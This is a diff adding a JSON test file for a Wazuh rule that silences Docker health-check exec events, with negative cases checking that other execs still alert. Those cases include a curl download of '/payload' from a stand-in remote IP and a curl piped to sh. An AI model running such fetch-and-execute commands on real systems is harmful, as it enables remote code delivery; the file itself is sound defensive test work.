@@ -1,0 +1,202 @@
+{
+  "rule": "100247",
+  "title": "Docker health check exec (level 0); any other exec keeps its stock level",
+  "cases": [
+    {
+      "name": "frigate health check",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: /bin/sh -c test -f /dev/shm/.frigate-is-stopping && exit 0; curl --fail --silent --show-error http://127.0.0.1:5000/api/version || exit 1",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "frigate",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: /bin/sh -c test -f /dev/shm/.frigate-is-stopping && exit 0; curl --fail --silent --show-error http://127.0.0.1:5000/api/version || exit 1",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "100247"
+      }
+    },
+    {
+      "name": "wazuh-mcp health check",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: /bin/sh -c curl -sf --max-time 5 http://localhost:3000/health | jq -e '.status == \"healthy\"' > /dev/null",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "wazuh-mcp",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: /bin/sh -c curl -sf --max-time 5 http://localhost:3000/health | jq -e '.status == \"healthy\"' > /dev/null",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "100247"
+      }
+    },
+    {
+      "name": "paperless health check",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: curl -fs -S -L --max-time 2 http://localhost:8000",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "paperless-webserver-1",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: curl -fs -S -L --max-time 2 http://localhost:8000",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "100247"
+      }
+    },
+    {
+      "name": "curl to a remote host stays 87907",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: curl -fs http://203.0.113.9:8080/payload",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "frigate",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: curl -fs http://203.0.113.9:8080/payload",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "87907"
+      }
+    },
+    {
+      "name": "curl piped to sh stays 87907",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: /bin/sh -c curl -sf http://localhost:3000/health | sh",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "wazuh-mcp",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: /bin/sh -c curl -sf http://localhost:3000/health | sh",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "87907"
+      }
+    },
+    {
+      "name": "admin command stays 87907",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: /var/ossec/bin/wazuh-control restart",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "single-node-wazuh.manager-1",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: /var/ossec/bin/wazuh-control restart",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "87907"
+      }
+    },
+    {
+      "name": "shell session stays 87908",
+      "location": "Wazuh-Docker",
+      "event": {
+        "integration": "docker",
+        "docker": {
+          "Type": "container",
+          "Action": "exec_start: bash ",
+          "Actor": {
+            "ID": "816d5babe7e096580d97c25d3bceee552d096e301a90224f7ce7a5194d05d023",
+            "Attributes": {
+              "name": "frigate",
+              "image": "example:local",
+              "execID": "0123456789abcdef"
+            }
+          },
+          "scope": "local",
+          "time": "1791564771",
+          "timeNano": "1791564771307828992.000000",
+          "status": "exec_start: bash ",
+          "id": "816d5babe7e0",
+          "from": "example:local"
+        }
+      },
+      "expect": {
+        "id": "87908"
+      }
+    }
+  ]
+}
